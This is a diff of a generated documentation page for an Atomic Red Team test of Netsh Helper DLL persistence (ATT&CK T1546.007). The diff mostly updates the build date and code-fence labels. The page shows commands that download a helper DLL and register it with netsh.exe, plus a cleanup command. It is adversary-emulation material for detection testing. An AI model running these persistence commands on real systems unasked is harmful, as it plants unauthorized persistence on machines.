@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.007"
 attack_technique_name: "Event Triggered Execution: Netsh Helper DLL"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.007/T1546.007.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "3244697d-5a3a-4dfc-941c-550f69f91a4d"
@@ -56,13 +56,13 @@ Helper DLL must exist on disk at specified location (#{helper_file})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{helper_file}") { exit 0} else { exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{helper_file}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll" -OutFile "#{helper_file}"
 ```
@@ -74,14 +74,14 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 netsh.exe add helper "#{helper_file}"
 taskkill /im notepad.exe /t /f > NUL 2>&1
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 netsh.exe delete helper "#{helper_file}"
 ```
 
